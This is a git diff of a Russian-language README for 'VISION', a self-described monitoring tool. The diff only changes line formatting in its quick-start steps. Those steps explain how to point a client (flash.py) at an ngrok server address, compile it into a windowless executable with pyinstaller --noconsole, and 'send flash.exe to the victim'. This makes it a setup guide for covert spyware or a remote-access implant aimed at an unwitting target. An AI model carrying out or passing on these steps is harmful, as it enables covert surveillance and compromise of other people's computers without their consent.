@@ -38,15 +38,21 @@ _**VISION** - это система мониторинга, предназнач
 ## Быстрый старт
 
 1.Установите VISION с GitHub напрямую или воспользовавшись командой:  
-`git clone https://github.com/hvru24/vision_ash/tree/main`
-2.Установите [все зависимости](#необходимые-зависимости) для серверной части.
-3.Запустите командный скрипт `run.bat` для запуска server.py и ngrok.
-4.Перейдите по адресу запущенного сервера (в командной строке запуска ngrok) и перейдите на сайт.
-`https://example.ngrok-free.app`
+`git clone https://github.com/hvru24/vision_ash/tree/main`  
+
+2.Установите [все зависимости](#необходимые-зависимости) для серверной части.  
+
+3.Запустите командный скрипт `run.bat` для запуска server.py и ngrok.  
+
+4.Перейдите по адресу запущенного сервера (в командной строке запуска ngrok) и перейдите на сайт.  
+`https://example.ngrok-free.app`  
+
 5.Скопируйте адрес и вставьте его во `flash.py` в переменную `SERVER_URL`:  
-`SERVER_URL = "https://example.ngrok-free.app"`
-6.Соберите flash.py в исполняемый файл (exe) с помощью команды:
-`pyinstaller --onefile --noconsole flash.py`
+`SERVER_URL = "https://example.ngrok-free.app"`  
+
+6.Соберите flash.py в исполняемый файл (exe) с помощью команды:  
+`pyinstaller --onefile --noconsole flash.py`  
+
 7.Перейдите в созданную папку `dist` и отправьте flash.exe жертве.
 
 ## Серверная часть проекта
